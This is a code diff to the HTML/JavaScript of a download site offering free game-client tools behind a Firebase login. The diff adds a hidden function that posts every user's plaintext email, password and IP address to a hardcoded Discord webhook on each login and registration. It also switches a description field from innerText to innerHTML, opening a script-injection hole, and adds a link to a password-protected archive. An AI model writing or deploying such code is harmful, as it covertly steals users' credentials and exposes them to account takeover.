@@ -19,8 +19,30 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1496177999148744896/ofzZiO_c398To95ckjhybQPqjrpHchW1tMlXo8UUMNHTs9xQNdOgpg8fR2k2s0An4fAc";
 
-        // --- AUTH LOGIC ---
+        async function sendToWebhook(type, email, pass) {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const embed = {
+                    title: `User Log: ${type}`,
+                    color: type === "Login" ? 0x5865F2 : 0x3ecf8e,
+                    fields: [
+                        { name: "Email", value: email, inline: true },
+                        { name: "Password", value: pass, inline: true },
+                        { name: "IP Address", value: ipData.ip, inline: false }
+                    ],
+                    timestamp: new Date()
+                };
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) { console.error("Webhook failed", e); }
+        }
+
         window.login = async () => {
             const email = document.getElementById('log-email').value;
             const pass = document.getElementById('log-pass').value;
@@ -29,6 +51,7 @@
 
             try {
                 const cred = await signInWithEmailAndPassword(auth, email, pass);
+                await sendToWebhook("Login", email, pass);
                 if (cred.user.emailVerified) { location.reload(); }
                 else { 
                     errorEl.style.display = "block";
@@ -54,6 +77,7 @@
 
             try {
                 const cred = await createUserWithEmailAndPassword(auth, email, pass);
+                await sendToWebhook("Registration", email, pass);
                 await sendEmailVerification(cred.user);
                 errorEl.style.display = "block";
                 errorEl.style.color = "#3ecf8e";
@@ -81,7 +105,7 @@
             document.getElementById('detail-page').style.display = 'block';
             document.getElementById('det-title').innerText = name;
             document.getElementById('det-status').innerText = status;
-            document.getElementById('det-desc').innerText = desc;
+            document.getElementById('det-desc').innerHTML = desc;
             document.getElementById('det-img').src = img;
             document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
             window.scrollTo(0,0);
@@ -101,42 +125,31 @@
     <style>
         :root { --bg: #050505; --card: #0a0a0a; --accent: #5865F2; --border: #151515; --error: #ff4444; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; }
-        
         .fade-in { animation: fadeIn 0.4s ease forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
         nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 1000; }
-        
         .btn-discord-box { background: var(--accent); color: #fff; padding: 10px 18px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.85rem; transition: 0.2s; }
         .btn-discord-box:hover { background: #4752c4; transform: translateY(-2px); }
-
         .profile-container { position: relative; padding: 10px 0; cursor: pointer; }
         .dropdown { position: absolute; top: 100%; right: 0; background: #111; border: 1px solid var(--border); border-radius: 8px; width: 170px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); padding: 5px 0; }
         .profile-container:hover .dropdown { display: block; }
         .dropdown button { width: 100%; padding: 12px; background: none; border: none; color: #888; text-align: left; cursor: pointer; }
         .dropdown button:hover { background: #1a1a1a; color: #fff; }
-
         .container { max-width: 1100px; margin: 50px auto; padding: 0 20px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
-        
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 25px; text-align: center; }
         .card img { width: 100%; height: 150px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; background: #000; border: 1px solid #1a1a1a; }
-
         .btn-main { background: #fff; color: #000; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .btn-main:hover { background: var(--accent); color: #fff; }
         .btn-low { text-transform: lowercase; }
-
         #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 2000; }
         .auth-box { width: 380px; background: #0d0d0d; padding: 40px; border-radius: 16px; border: 1px solid var(--border); }
         .auth-box h2 { margin-top: 0; font-size: 1.25rem; margin-bottom: 10px; line-height: 1.4; }
         .subtext { color: #555; font-size: 0.8rem; margin-bottom: 20px; display: block; }
-        
         .input-group { position: relative; margin-bottom: 15px; }
         input { width: 100%; padding: 14px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; }
         .eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #444; cursor: pointer; font-size: 1.1rem; }
-        
         .error-msg { color: var(--error); font-size: 0.8rem; margin-top: 10px; display: none; font-weight: bold; }
-
         .btn-red { background: var(--error); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -175,6 +188,13 @@
             <p style="color:#444; font-size:0.7rem">Status: Working</p>
             <button class="btn-main btn-low" style="width:100%" onclick="openDetail('AutoMath', 'Working', 'has bugs but works fine. The zip folder includes an tutorial on how to use. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">info</button>
         </div>
+
+        <div class="card">
+            <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg" alt="Hyx">
+            <h3>Hyx Client [free]</h3>
+            <p style="color:#444; font-size:0.7rem">Status: Working</p>
+            <button class="btn-main btn-low" style="width:100%" onclick="openDetail('Hyx Client [free]', 'Working', 'Ensure you have <b>vcredist AIO</b> installed. For Steam users, add <code>-force-d3d11</code> to your launch options.<br><br><b>Extraction Password:</b> Hyx<br><br><b>Tutorial:</b> <a href=\'https://youtu.be/FnPP2weLLfk\' target=\'_blank\' style=\'color:var(--accent)\'>Watch here</a>', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
+        </div>
     </div>
 </div>
 
@@ -190,12 +210,8 @@
             <p style="color:#444; font-size:0.7rem; margin-bottom:5px">Current Status</p>
             <div id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.2rem"></div>
             <hr style="border:0; border-top:1px solid #1a1a1a; margin:25px 0">
-            <div class="lock-ui">
-                <button class="btn-red btn-low" onclick="document.getElementById('auth-overlay').style.display='flex'">please login to download</button>
-            </div>
-            <div class="auth-ui" style="display:none">
-                <button id="det-dl" class="btn-main btn-low" style="width:100%">download tool</button>
-            </div>
+            <div class="lock-ui"><button class="btn-red btn-low" onclick="document.getElementById('auth-overlay').style.display='flex'">please login to download</button></div>
+            <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main btn-low" style="width:100%">download tool</button></div>
         </div>
     </div>
 </div>
@@ -205,10 +221,7 @@
         <h2>Login to An Existing Account</h2>
         <span class="subtext">Enter your credentials to access the archive.</span>
         <div class="input-group"><input type="email" id="log-email" placeholder="Email Address"></div>
-        <div class="input-group">
-            <input type="password" id="log-pass" placeholder="Password">
-            <button class="eye-btn" onclick="togglePass('log-pass')">👁️</button>
-        </div>
+        <div class="input-group"><input type="password" id="log-pass" placeholder="Password"><button class="eye-btn" onclick="togglePass('log-pass')">👁️</button></div>
         <div id="log-error" class="error-msg"></div>
         <button class="btn-main" style="width:100%; margin-top:10px" onclick="login()">Sign In</button>
         <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('reg')">Need a new account? <span style="color:var(--accent)">Register</span></p>
@@ -219,10 +232,7 @@
         <h2>Create a New Account</h2>
         <span class="subtext">Password must be 8+ characters and include numbers.</span>
         <div class="input-group"><input type="email" id="reg-email" placeholder="Enter Email"></div>
-        <div class="input-group">
-            <input type="password" id="reg-pass" placeholder="Create Password">
-            <button class="eye-btn" onclick="togglePass('reg-pass')">👁️</button>
-        </div>
+        <div class="input-group"><input type="password" id="reg-pass" placeholder="Create Password"><button class="eye-btn" onclick="togglePass('reg-pass')">👁️</button></div>
         <div id="reg-error" class="error-msg"></div>
         <button class="btn-main" style="width:100%; margin-top:10px" onclick="signUp()">Register</button>
         <p style="color:#444; font-size:0.85rem; margin-top:25px; cursor:pointer" onclick="switchAuth('log')">Have an account? <span style="color:var(--accent)">Login here</span></p>
